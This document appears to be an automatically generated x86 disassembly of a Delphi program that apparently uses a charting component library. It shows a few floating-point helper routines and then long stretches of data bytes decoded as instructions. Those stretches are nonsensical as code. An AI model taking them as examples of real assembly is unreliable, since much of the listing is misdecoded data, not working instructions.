xor edi edi
inc edi
dec esi
jne r-xdata
test bl bl
je r-xdata
mov edx edi
mov eax [ esp + 0x4 ]
call sub_4143bc
mov edx eax
mov eax [ esp ]
call sub_47fdd4
mov ebp eax
mov eax ebp
mov edx [ eax ]
call [ edx + 0x24 ]
cmp eax [ esp + 0x8 ]
jle r-xdata
push [ esp + 0x14 ]
push [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0xc ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ esp + 0x10 ]
mov edx [ eax ]
call [ edx + 0x48 ]
fstp [ esp + 0x10 ]
fwait
mov edx [ esp + 0x8 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp + 0x10 ]
fwait
xor ebx ebx
jmp r-xdata
sub_485618
push ebp
mov ebp esp
add esp 0xfffffff8
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
fld [ ebp + 0x10 ]
fdiv [ ebp + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
fld [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn 0x10
sub_485654
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
call sub_47fdd4
mov edi eax
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov ebx [ ebp - 0x4 ]
mov esi [ ebp + 0x8 ]
sub esi ebx
jl r-xdata
mov eax edi
call sub_47f420
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
fld [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc esi
fld [ ebp - 0x18 ]
fcomp [ ebp - 0x10 ]
fnstsw ax
sahf
jbe r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ ebp - 0x18 ]
fwait
cmp ebx [ ebp - 0x4 ]
jne r-xdata
sub_4856d4
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov ebp ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
mov eax [ esp + 0x4 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
fld [ esp + 0x8 ]
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov edx ebp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp + 0x10 ]
fwait
test ebx ebx
je r-xdata
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_4143bc
mov edx eax
mov eax [ esp ]
call sub_47fdd4
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
cmp ebp eax
jge r-xdata
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0xc ] eax
fld [ esp + 0x10 ]
fcomp [ esp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
sub_485760
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
call sub_47fdd4
mov edi eax
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov ebx [ ebp - 0x4 ]
mov esi [ ebp + 0x8 ]
sub esi ebx
jl r-xdata
mov eax edi
call sub_47f448
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
fld [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc esi
fld [ ebp - 0x18 ]
fcomp [ ebp - 0x10 ]
fnstsw ax
sahf
jae r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ ebp - 0x18 ]
fwait
cmp ebx [ ebp - 0x4 ]
jne r-xdata
sub_4857e0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov ebp ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
mov eax [ esp + 0x4 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
fld [ esp + 0x8 ]
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov edx ebp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp + 0x10 ]
fwait
test ebx ebx
je r-xdata
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_4143bc
mov edx eax
mov eax [ esp ]
call sub_47fdd4
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
cmp ebp eax
jge r-xdata
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0xc ] eax
fld [ esp + 0x10 ]
fcomp [ esp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
sub_48586c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov edx esi
mov eax ebx
call sub_47fdd4
mov edi eax
mov esi [ ebp - 0x4 ]
mov ebx [ ebp + 0x8 ]
sub ebx esi
jl r-xdata
mov eax esi
call sub_481f8c
test eax eax
jle r-xdata
mov eax [ ebp + 0x8 ]
sub eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x1c ] eax
fild [ ebp - 0x1c ]
fdivr [ ebp - 0x10 ]
fstp [ ebp - 0x10 ]
fwait
inc ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
jmp r-xdata
mov edx esi
mov eax ebx
call sub_47fdd4
call sub_47f470
fstp [ ebp - 0x18 ]
fwait
mov eax esi
call sub_481f8c
mov [ ebp - 0x1c ] eax
fild [ ebp - 0x1c ]
fdivr [ ebp - 0x18 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xc ]
fadd [ ebp - 0x10 ]
fstp [ ebp - 0x10 ]
fwait
inc esi
dec ebx
jne r-xdata
fld [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_485914
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov ebp edx
mov [ esp ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
mov eax [ ebp + 0x8 ]
test eax eax
jle r-xdata
fld [ esp + 0x8 ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
xor edx edx
mov [ esp + 0x10 ] edx
mov esi eax
dec esi
test esi esi
jl r-xdata
cmp [ esp + 0x10 ] 0x0
jle r-xdata
inc esi
xor edi edi
fild [ esp + 0x10 ]
fdivr [ esp + 0x8 ]
fstp [ esp + 0x8 ]
fwait
inc edi
dec esi
jne r-xdata
inc [ esp + 0x10 ]
mov edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
fadd [ esp + 0x8 ]
fstp [ esp + 0x8 ]
fwait
mov edx edi
mov eax ebp
call sub_4143bc
mov edx eax
mov eax [ esp ]
call sub_47fdd4
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp eax [ esp + 0x4 ]
jle r-xdata
sub_4859a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4859c9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4859d0
retn
sub_485ab1
xor eax 0x35980040
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
je r-xdata
cwde
xor eax 0x359c0040
inc eax
add [ eax - 0x6bffbfcb ] ah
dec eax
add [ eax - 0x5fffbeb6 ] bl
dec edx
inc ecx
add [ eax + 0x1000487a ] bh
push esp
inc ebx
jne r-xdata
add [ eax ] eax
add eax 0x73757242
push r-xdata
add al 0x0
dec eax
add [ eax - 0x5fffbeb6 ] bl
dec edx
inc ecx
add [ eax + 0xa00487a ] bh
push esp
inc ebx
push 0x57747261
popad
insb
insb
nop
sbb [ ebx + 0x48 ] 0x0
pop es
or dl [ ebx + eax * 2 + 0x68 ]
popad
jb r-xdata
xor eax 0x32dc0040
xchg esp eax
je r-xdata
add [ eax - 0x80000000 ] al
add al 0x0
add edx [ eax + 0x65 ]
outsb
add [ edx + edi * 2 + 0x48 ] ch
add [ eax - 0x80000000 ] al
add al [ eax ]
add eax 0x6f6c6f43
push edi
popad
insb
insb
pop ebx
dec eax
add al dh
pop edx
dec eax
add [ esi ] al
add [ 0x72616843 ] al
je r-xdata
inc eax
add al bh
xor al [ eax ]
je r-xdata
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
insd
inc ebx
push 0x57747261
popad
insb
insb
lea eax [ eax ]
hlt
push esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ eax ] al
or al 0x0
add bh bh
jo r-xdata
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500b0000 ] al
popad
jb r-xdata
add [ eax + ebp * 2 ] al
dec eax
add [ eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
pop ebp
dec eax
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
mov al 0x5c
dec eax
add [ esi ] al
mov eax eax
push 0x300485c
or al 0x54
dec esp
outsb
push ebx
je r-xdata
outsd
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
push es
inc esp
popad
jb r-xdata
imul esi [ ebx ] 0x44
sbb [ edi ] 0x47
outsb
je r-xdata
outsb
jo r-xdata
add eax 0x72616843
je r-xdata
insb
add eax 0x6f54616c
jo r-xdata
insb
popad
push edx
imul esp [ edi + 0x68 ] 0x616c0574
push esp
outsd
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ esp + ebx * 2 + 0x48 ] ah
add [ esi ] al
insb
jae r-xdata
add [ eax + eax ] cl
add [ eax ] al
adc al 0x72
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ edi ] cl
dec esp
outsb
inc ebp
js r-xdata
dec eax
add [ eax ] al
jae r-xdata
jb r-xdata
add [ eax ] dl
add [ eax ] al
xor eax [ eax + eax * 4 + 0x1f ]
inc edi
jb r-xdata
push 0x40747261
pop edx
dec eax
add [ eax ] cl
add [ eax ] al
inc [ ebx + edi * 2 + 0x48 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050001 ] al
jb r-xdata
dec eax
push es
push ebx
je r-xdata
add [ esp + ebx * 2 + 0x48 ] ah
add [ eax + edx + 0x40 ] dl
add [ eax + edx - 0x3f74ffc0 ] bh
and [ esi + 0x48 ] bl
imul ebp [ edi + 0x6e ] r-xdata
or [ eax ] dl
push esp
dec edi
outsb
inc edi
je r-xdata
push esp
adc [ eax ] al
adc al 0x0
add bh bh
push eax
push eax
outsb
insb
popad
dec esp
je r-xdata
mov ah 0x5c
dec eax
add [ ebx ] al
adc [ esp + ecx * 2 + 0x65 ] dl
outsb
inc ecx
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
outsd
popad
jae r-xdata
add eax 0x72616843
je r-xdata
insb
popad
inc edx
outsb
outsd
insd
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x600485c ] dh
jne r-xdata
jae r-xdata
or al 0x6c
insb
jae r-xdata
add [ eax ] al
add eax 0x69530400
jpe r-xdata
add [ eax ] al
jae r-xdata
inc eax
add [ eax - 0x6bffbfcb ] ah
je r-xdata
add [ edx ] al
add [ ebx ] cl
mov al 0xd
mov al 0xd0
lahf
dec eax
add al bl
lahf
dec eax
add [ edx ] dl
push esp
inc ebx
jne r-xdata
pop esp
stosb [ edi ]
dec eax
imul ebp [ esi + 0x67 ] 0x47a48000
jae r-xdata
add [ edx + ebp * 4 + 0x48 ] bl
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
jb r-xdata
push esp
js r-xdata
outsb
add [ ebp + ebx * 2 + 0x48 ] al
push esi
popad
insb
jne r-xdata
je r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx * 2 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
pop esi
dec eax
add [ eax + ecx ] al
push es
push ebx
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
jpo r-xdata
add bh bh
pushad
jpo r-xdata
mov ah 0x41
add [ eax + eax ] al
add [ eax + 0x1 ] al
add [ eax ] al
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
inc eax
pop edx
dec eax
add [ eax ] dl
add [ eax ] al
[ ecx + 0x48 ]
add [ eax + 0xc00485c ] dh
add [ eax ] al
push [ edi + ebx * 4 + 0x10048 ]
add [ eax ] al
add [ eax ] al
inc eax
add al bh
xor al [ eax ]
mov al 0x9e
dec eax
add [ eax - 0x5fffbeb6 ] bl
dec edx
inc ecx
pushfd
xor eax 0x35a00040
insd
inc ebx
push 0x4c747261
outsb
lea eax [ eax ]
pop esp
pop esi
dec eax
add [ edi ] al
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
xor eax 0x32dc0040
mov al [ 0xffffffff94004035 ]
outsd
dec esp
push esp
js r-xdata
or cl [ ebp + 0x67 ]
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
pop ebp
or [ ebx + esi * 2 + 0x53 ] ch
add [ ebx ] cl
dec esp
outsb
push ebx
je r-xdata
push esp
inc ebx
jne r-xdata
add al dh
sahf
dec eax
add [ ebx + 0x48 ] dh
add [ edx + ebp * 4 + 0x48 ] bl
add [ esp + edx * 2 ] cl
inc ebx
push 0x4c747261
outsb
lea eax [ eax ]
clc
pop esi
dec eax
add [ edi ] al
or al 0x54
inc ebx
push 0x4c747261
outsb
rcr [ fs : esi + 0x48 ] 0x1
add [ eax + 0x5e ] bl
dec eax
add [ ebx ] dl
add [ 0x72616843 ] al
je r-xdata
outsd
insd
inc ebx
push 0x4c747261
outsb
and [ fs : esi + 0x48 ] bl
add [ eax + 0x4771 ] bh
add [ 0x72616843 ] al
je r-xdata
nop
inc ebx
push 0x90747261
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
xor eax 0x35a00040
insb
or al 0x54
dec esp
outsb
push ebx
je r-xdata
dec eax
add [ edx + 0x5e ] al
dec eax
add [ eax ] dh
add [ eax ] al
dec esp
jno r-xdata
add [ eax ] al
add [ eax ] al
xor al 0x5e
je r-xdata
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
add [ ebx + 0x485ed0c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
pop esi
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
pop esi
dec eax
add [ eax ] dh
add [ eax ] al
aam 0x5d
dec eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add al bh
xor al [ eax ]
mov al 0x9e
dec eax
add [ eax - 0x5fffbeb6 ] bl
dec edx
inc ecx
add al dh
sahf
dec eax
add [ ebx + 0x48 ] dh
insb
add [ gs : 0x65646e49 ] al
js r-xdata
add [ eax ] al
insd
inc ecx
js r-xdata
add [ edx ] ecx
dec ecx
outsb
je r-xdata
add [ eax ] al
jae r-xdata
xchg esp eax
xor eax 0x32dc0040
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx * 2 + 0x48 ] bl
add [ ebx + 0x485e20c0 ] cl
popad
outsb
insb
sub_485f47
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050001 ] al
jb r-xdata
add bh bh
jae r-xdata
cwde
lahf
dec eax
add [ ecx ] al
je r-xdata
add eax 0x69460a00
jb r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x40105473
add [ eax ] ah
add [ eax ] al
[ eax - 0x60 ]
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
mov ah 0x41
add [ eax + eax ] dl
add bh bh
js r-xdata
add [ eax ] al
or al 0x0
or edx [ edx + 0x65 ]
jae r-xdata
jb r-xdata
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x6f ]
jb r-xdata
popad
insb
jne r-xdata
pop esi
dec eax
add [ eax + 0x5e ] bl
dec eax
add [ ebx ] dl
add [ 0x72616843 ] al
je r-xdata
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add al [ eax ]
add eax 0x6f6c6f43
jb r-xdata
add [ edi ] cl
add [ ecx ] cl
jpe r-xdata
mov ah 0x41
add [ eax ] cl
add bh bh
mov esp 0x10048a2
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x68530b00
popad
outsd
ja r-xdata
pop esp
dec eax
add [ 0xfffffffff8ff0000 ] ch
mov al [ 0x10048 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or ecx [ ebp + 0x67 ]
outsb
push ebx
je r-xdata
add [ edx ] cl
dec ebp
jpe r-xdata
add [ eax ] dl
inc eax
add [ eax + eax ] ch
add bh bh
add al 0xb9
inc ecx
add [ eax ] cl
add [ eax ] al
dec [ eax - 0x78 ]
inc edi
add ah dl
xchg [ edi ] eax
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ esi + eax * 2 ] al
add [ eax + 0x1 ] al
add [ eax ] al
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
inc eax
pop edx
dec eax
add [ eax ] dl
add [ eax ] al
[ ecx + 0x48 ]
add [ eax + 0xc00485c ] dh
add [ eax ] al
push [ edi + ebx * 4 + 0x10048 ]
add [ eax ] al
add [ eax ] al
pop eax
mov al [ 0x10048 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
sbb [ eax ] al
add bh bh
xchg esp eax
mov eax [ 0x10048 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
add [ eax ] al
inc ebx
push 0x64747261
or [ ebp + 0x78 ] edx
je r-xdata
outsd
insb
outsd
jb r-xdata
push esp
js r-xdata
add bh bh
fsub [ edx + 0x10048 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
push cs
add [ edx ] cl
push ebx
push 0x776f6461
push ebx
js r-xdata
insb
jne r-xdata
push esp
adc [ eax ] al
xor [ eax ] al
add bh bh
fsub [ eax + 0x10048 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0xa ] al
or eax [ eax ]
or cl [ ebp + 0x61 ]
popad
jb r-xdata
add [ eax + 0xc ] al
add eax [ eax ]
or al [ ebx + 0x6f ]
insb
outsd
jb r-xdata
pop ds
inc edi
add [ eax + eax ] ah
add bh bh
les ebx [ edi + 0x10048 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ 0x6d617246 ] al
push esp
adc [ eax ] al
sub [ eax ] al
add bh bh
adc al 0xa1
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
je r-xdata
add bh bh
dec eax
mov [ edi ] al
aam 0x87
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040006 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
sbb al 0x0
add bh bh
hlt
je r-xdata
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
add [ eax ] al
add [ eax ] ch
bound ecx [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ edx + 0x48 ] ah
add [ eax + eax ] bh
insb
push esp
adc [ eax ] al
push esp
add [ eax ] al
jmp eax
lahf
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8b656c62
ror [ edx ] 0x48
add [ eax ] al
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xa ] al
adc [ eax ] al
push es
push esp
outsd
jo r-xdata
adc [ eax ] al
dec esp
add [ eax ] al
popad
outsd
ja r-xdata
push edx
outsd
ja r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
or [ ecx + 0x6e ] cl
jbe r-xdata
imul ebp [ esi ] 0x2c004010
add [ eax ] al
[ eax + 0x100489f ]
add [ eax ] al
add [ eax ] al
or al 0x62
dec eax
add [ eax + 0x8004771 ] bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax - 0x5fffbeb6 ] bl
dec edx
inc ecx
add [ esp + edi * 2 + 0x48 ] cl
add [ ebx ] cl
push esp
inc ebx
push 0x54747261
imul esi [ esp + ebp * 2 + 0x65 ] r-xdata
pop es
or edx [ ebx + eax * 2 + 0x68 ]
popad
jb r-xdata
outsd
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
imul edi [ edx + 0x65 ] r-xdata
push eax
add [ eax ] al
dec esp
mov al [ 0x10048 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
str [ ecx ]
inc edi
add [ eax ] dl
add bh bh
int3
add [ eax ] dl
inc eax
add [ eax + eax ] al
call [ eax - 0x5f ]
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jae r-xdata
[ ebp + edi * 2 + 0x10048 ]
add [ eax ] al
adc [ eax ] al
or al 0x0
add bh bh
lodsb [ esi ]
jge r-xdata
add [ esp + edi * 2 + 0x48 ] ch
add [ eax - 0x80000000 ] al
add al 0x0
add al 0x46
inc esi
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x42050002 ] al
jb r-xdata
add [ 0x72616843 ] al
je r-xdata
push esp
imul esi [ esp + ebp * 2 + 0x65 ] r-xdata
mov eax 0x8004771
add [ eax ] al
dec esp
jno r-xdata
add [ eax ] al
add [ eax ] al
sub [ edx + 0x48 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
bound ecx [ eax ]
cmp al 0x0
adc [ eax ] eax
or dl [ esi + 0x65 ]
jb r-xdata
adc [ eax ] al
pop eax
add [ eax ] al
push [ eax ]
mov eax [ 0x10048 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
dec ebp
popad
jb r-xdata
add [ gs : ecx ] al
add [ eax ] dl
inc eax
add [ eax ] dh
add [ eax ] al
[ ebp + edi * 2 + 0x10048 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
jge r-xdata
mov ah 0x41
add [ eax + eax ] dl
add bh bh
fdivr [ ebp + 0x48 ]
add [ ecx ] al
add [ eax ] al
jge r-xdata
add [ eax ] al
or eax [ ecx + 0x64 ]
push 0x75
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop es
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ eax + 0x63 ] bl
dec eax
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x68 ]
popad
jb r-xdata
add [ eax ] al
and [ edi ] al
sbb [ eax ] al
add bh bh
call 0x148ab7a
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46050005 ] al
jb r-xdata
jb r-xdata
inc ebx
outsd
insb
outsd
insd
jo r-xdata
xor al [ eax ]
dec eax
jge r-xdata
xor al [ eax ]
clc
imul ebp [ esi ] 0x5c004010
add [ eax ] al
je r-xdata
jb r-xdata
or [ edi ] cl
push esp
inc ebx
push 0x43747261
inc ebx
insb
imul esp [ ebx + 0x6b ] 0x6080500
push ebx
outsb
jb r-xdata
arpl [ ebx ] bp
add eax 0x65530608
outsb
add [ eax + 0x54040006 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
dec [ eax - 0x78 ]
inc edi
mov ecx 0x80041
add bh bh
dec eax
mov [ edi ] al
lodsb [ esi ]
jl r-xdata
outsd
outsb
je r-xdata
add [ eax ] 0x0
add [ eax + 0x46040004 ] al
add [ ecx ] al
add [ eax ] al
or al 0x54
insd
movsb [ edi ] gs : [ esi ]
and eax [ ecx ]
sbb al 0x0
add bh bh
mov [ ebp + 0x48 ] bh
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
inc eax
pop edx
dec eax
add [ eax ] dl
add [ eax ] al
dec esp
inc ecx
add [ 0xffffffffbcff0000 ] cl
jge r-xdata
inc ebx
jne r-xdata
outsd
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
or [ ecx + eax * 2 ] al
push esp
inc ebx
add [ esi ] al
inc ebx
jne r-xdata
push esp
js r-xdata
push es
add [ esp + edx * 2 ] al
add [ eax ] al
add [ eax ] al
or [ esi ] al
push ebx
outsb
jb r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] ah
add eax [ eax ]
add eax 0x6f6c6f43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add [ eax ] eax
add [ eax ] ah
lodsd [ esi ]
je r-xdata
push 0x8747261
inc edx
jne r-xdata
inc edx
jb r-xdata
push esp
inc ebx
push 0x43747261
jae r-xdata
add [ eax ] cl
je r-xdata
js r-xdata
outsd
je r-xdata
add [ esi ] al
inc edx
jne r-xdata
insd
inc ebx
push 0x747261
push es
pop es
outsb
push eax
outsd
jae r-xdata
inc edi
push 0xad200048
insd
inc ebx
add [ eax + edx + 0x40 ] dl
add al al
aam 0x43
jae r-xdata
push es
je r-xdata
add al 0x68
dec eax
add al al
aam 0x43
add [ eax + 0x54004119 ] ch
adc [ eax ] al
push esp
adc [ eax ] al
nop
aam 0x63
dec eax
add [ eax ] cl
andps xmm0 [ ebx + 0x68 ]
popad
jb r-xdata
pop es
add [ esi ] al
push esp
inc ebx
push 0x41747261
add [ eax + 0x7 ] ebx
insb
imul esp [ ebx + 0x6b ] 0x69726553
inc ebx
dec eax
insd
inc ebx
push 0x8747261
jne r-xdata
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
inc ebx
push 0x41747261
insb
insb
outsd
ja r-xdata
jb r-xdata
add eax 0x65530608
outsb
add [ edx ] cl
push esi
popad
push esp
jb r-xdata
outsb
add [ 0x66696853 ] al
je r-xdata
je r-xdata
insb
imul esp [ ebx + 0x6b ] 0x73697841
inc ebx
push ebx
jb r-xdata
or [ esi ] al
push esp
je r-xdata
push ebx
